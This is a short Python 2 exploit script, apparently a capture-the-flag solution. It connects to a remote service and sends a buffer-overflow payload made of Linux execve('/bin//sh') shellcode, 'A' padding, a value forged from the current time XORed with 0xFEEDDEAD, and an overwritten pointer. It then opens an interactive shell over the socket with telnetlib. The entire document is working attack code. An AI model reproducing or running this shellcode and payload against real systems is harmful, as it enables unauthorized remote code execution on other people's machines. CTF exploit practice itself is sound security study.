import socket
from struct import pack,unpack
from ctypes import c_int32
import telnetlib
import time,random
import sys

LOCAL = ('localhost',31336)
LOCAL = (sys.argv[1],31331)
BUFFER = 4096





s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(LOCAL)

def recv_until(str,debug=0):
    recv_ = ''
    while not str in recv_:
        tmp = s.recv(BUFFER)
        recv_ += tmp
        if debug:
            print tmp
        continue
    return recv_

x = time.time()

shellcode = '\x31\xc0\x89\xc2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xc1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80'

raw_input("?")
recv_until('>')

edi = 0x8049252
payload = pack('<I',edi+4)
payload += pack('<I',edi+8)
payload += shellcode
payload = payload.ljust(100,'A')
payload += pack('<I',int(x) ^ 0xFEEDDEAD)
payload += pack('<I',edi) # edi

s.send('::\n')
s.send(payload)


t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
